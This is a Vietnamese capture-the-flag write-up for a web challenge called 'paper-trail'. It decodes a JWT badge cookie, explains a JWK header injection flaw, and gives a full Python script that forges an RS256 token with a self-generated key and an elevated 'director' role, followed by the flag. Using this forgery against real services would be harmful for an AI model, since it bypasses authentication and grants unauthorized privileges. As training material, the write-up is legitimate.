# web/paper-trail

Khi truy cập challenge, ứng dụng hiển thị một form check-in:

![alt text](image.png)

Nhập tên bất kì. Request được gửi tới endpoint:

![alt text](image-1.png)

Server trả về redirect `302 Found` và set cookie:

Điều này cho thấy ứng dụng sử dụng JWT để lưu thông tin badge của visitor.

## Phân tích JWT

Cookie nhận được:

```text
paper_badge=eyJhbGciOiJSUzI1NiIsImtpZCI6ImZyb250LWRlc2stMjAyNiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJwYXBlci10cmFpbC1vZmZpY2UiLCJhdWQiOiJwYXBlci10cmFpbC12aXNpdG9ycyIsInN1YiI6IjcyMDQyZjllMDYyNTA2NGYiLCJuYW1lIjoiZnJvZyIsInJvbGUiOiJ2aXNpdG9yIiwiaWF0IjoxNzc5MDE3MzE3LCJuYmYiOjE3NzkwMTczMTcsImV4cCI6MTc3OTAyMDkxN30.ecfs2Jj38eZalf7OUzFa9OJWtEcUKyEyhHW3mFRWlWhlFgUD12jZGlh9Hhy1O-iZ8knBIgTRq2qu5GMSX5noo_JMUgJVeNcVq7v5hw5f0QZmZ2VSJSC5MPEgOSZUNNUvYv5TamSZ_khXVFBSJGYPifbIufrAHwURivNk7YI8AMaf0VBvAkihiUPWrGRDQT5ZOFOe4wwjKS6AvmcvnOr-g3qUH-cDZs3Mns3ne1ZJZuwyDYfTv1PbLLG6JRrmdcQWYL7BysI1RafCVgoARaJVpH3YIRW5XUI44JTU7LXrYrCQZUxufTrcHWCkL981APqw2vqGcPZcrDFR22FwBXjPTw
```

JWT gồm 3 phần:

```text
header.payload.signature
```

Decode JWT ban đầu, ta thấy payload có nội dung tương tự:

```json
{
  "iss": "paper-trail-office",
  "aud": "paper-trail-visitors",
  "sub": "72042f9e0625064f",
  "name": "frog",
  "role": "visitor",
  "iat": 1779017317,
  "nbf": 1779017317,
  "exp": 1779020917
}
```

Truy cập `VAULT DRAWER`:

![alt text](image-2.png)

Với `role = visitor` sẽ không trả flag vì quyền chưa đủ.

Mục tiêu là tạo được JWT hợp lệ có `role = director`

## Phân tích lỗi

JWT ban đầu dùng thuật toán:

```json
{
  "alg": "RS256",
  "kid": "front-desk-2026",
  "typ": "JWT"
}
```

Với `RS256`, server thường phải verify chữ ký bằng public key cố định ở phía backend.

Tuy nhiên challenge này tồn tại lỗi JWK header injection. JWT cho phép header chứa trường `jwk`.

## Forge JWT mới

```python
import jwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

old_token = "eyJhbGciOiJSUzI1NiIsImtpZCI6ImZyb250LWRlc2stMjAyNiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJwYXBlci10cmFpbC1vZmZpY2UiLCJhdWQiOiJwYXBlci10cmFpbC12aXNpdG9ycyIsInN1YiI6IjcyMDQyZjllMDYyNTA2NGYiLCJuYW1lIjoiZnJvZyIsInJvbGUiOiJ2aXNpdG9yIiwiaWF0IjoxNzc5MDE3MzE3LCJuYmYiOjE3NzkwMTczMTcsImV4cCI6MTc3OTAyMDkxN30.ecfs2Jj38eZalf7OUzFa9OJWtEcUKyEyhHW3mFRWlWhlFgUD12jZGlh9Hhy1O-iZ8knBIgTRq2qu5GMSX5noo_JMUgJVeNcVq7v5hw5f0QZmZ2VSJSC5MPEgOSZUNNUvYv5TamSZ_khXVFBSJGYPifbIufrAHwURivNk7YI8AMaf0VBvAkihiUPWrGRDQT5ZOFOe4wwjKS6AvmcvnOr-g3qUH-cDZs3Mns3ne1ZJZuwyDYfTv1PbLLG6JRrmdcQWYL7BysI1RafCVgoARaJVpH3YIRW5XUI44JTU7LXrYrCQZUxufTrcHWCkL981APqw2vqGcPZcrDFR22FwBXjPTw"

payload = jwt.decode(
    old_token,
    options={
        "verify_signature": False,
        "verify_exp": False,
        "verify_aud": False
    }
)

payload["role"] = "director"

key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048
)

private_pem = key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)

public_numbers = key.public_key().public_numbers()

def b64url_uint(n):
    return jwt.utils.base64url_encode(
        n.to_bytes((n.bit_length() + 7) // 8, "big")
    ).decode()

jwk = {
    "kty": "RSA",
    "e": b64url_uint(public_numbers.e),
    "n": b64url_uint(public_numbers.n)
}

headers = {
    "alg": "RS256",
    "typ": "JWT",
    "kid": "front-desk-2026",
    "jwk": jwk
}

new_token = jwt.encode(
    payload,
    private_pem,
    algorithm="RS256",
    headers=headers
)

print(new_token)
```

Script sẽ sinh ra một JWT mới có `role = director` và header chứa `jwk` public key do mình tự tạo.

Thay token mới vào:

![alt text](image-3.png)

## Flag

```text
tjctf{7h47_is_4_nic3_k3yc4rd_y0u_g07_7h3r3}
```
